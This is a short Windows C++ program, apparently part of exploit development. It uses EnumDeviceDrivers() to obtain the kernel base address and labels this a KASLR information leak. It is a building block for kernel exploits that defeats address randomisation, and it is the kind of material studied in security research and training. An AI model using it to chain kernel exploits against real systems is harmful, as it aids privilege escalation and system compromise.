#include <windows.h>
#include <iostream>
#include <Psapi.h>

int main() {

	std::cout << "[+] Preparing KASLR information leak with EnumDeviceDrivers()\n";

	LPVOID drivers[1024];
	DWORD cbNeeded;

	EnumDeviceDrivers(drivers, sizeof(drivers), &cbNeeded);
	PVOID KernelBaseAddress = { 0 };

	std::cout << "[+] Getting kernel base address\n";
	KernelBaseAddress = drivers[0];
	std::cout << "[+] Successfully leaked the kernel base address\n";
	std::cout << "\t[>] Kernel base address -  0x" << KernelBaseAddress << std::endl;

	return 0;
}
